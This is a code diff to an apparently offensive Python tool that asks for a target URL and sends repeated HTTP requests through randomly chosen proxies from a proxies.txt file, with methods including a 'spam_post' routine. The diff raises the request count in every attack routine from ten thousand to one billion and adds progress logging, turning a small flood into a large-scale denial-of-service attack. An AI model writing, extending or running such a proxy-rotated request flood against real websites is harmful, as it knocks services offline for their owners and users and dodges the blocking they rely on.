@@ -20,7 +20,7 @@ class Thread:
         
         start = perf_counter()
         proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
-        total = 1000*10
+        total = 1000000000
         
         def func (iteration):
             methods = ["get"]
@@ -57,14 +57,15 @@ class Thread:
         
         start = perf_counter()
         proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
-        total = 1000*10
-        
+        total = 1000000000
+
         def func (iteration):
-            methods = ["get", "post"]
+            global counter
+            methods = ["get", "head"]
             
             try:
                 proxy = {
-                  "http": random.choice(proxies)
+                    "http": random.choice(proxies)
                 }
                 
                 for method in methods:
@@ -72,8 +73,7 @@ class Thread:
                     stop = perf_counter()
                     
                     if output:
-                        log("info", f"| [{ math.floor(stop - start) }s] | { output }")
-                        
+                        log("info", f"| { iteration }/{ total } | [{ math.floor(stop - start) }s] | { output }")
             except Exception as err:
                 log("error", str(err))
                 
@@ -93,7 +93,7 @@ class Thread:
         
         start = perf_counter()
         proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
-        total = 1000*10
+        total = 1000000000
         
         def func (iteration):
             methods = ["head", "get", "post", "delete", "patch", "put"]
@@ -101,7 +101,7 @@ class Thread:
             
             try:
                 proxy = {
-                  "http": random.choice(proxies)
+                    "http": random.choice(proxies)
                 }
                 
                 for method in methods:
@@ -131,7 +131,7 @@ class Thread:
         
         start = perf_counter()
         proxies = get_proxies(f"{ PATH_PROGRAM }/proxies.txt")
-        total = 1000*10
+        total = 1000000000
         
         def func (iteration):
             methods = ["head", "get", "post"]
@@ -162,7 +162,7 @@ class Thread:
     @staticmethod
     def spam_post () -> None:
         url = question("input url target")
-        total = 1000*10
+        total = 1000000000
         
         if not checkValidUrl(url):
             Thread.spam_post()
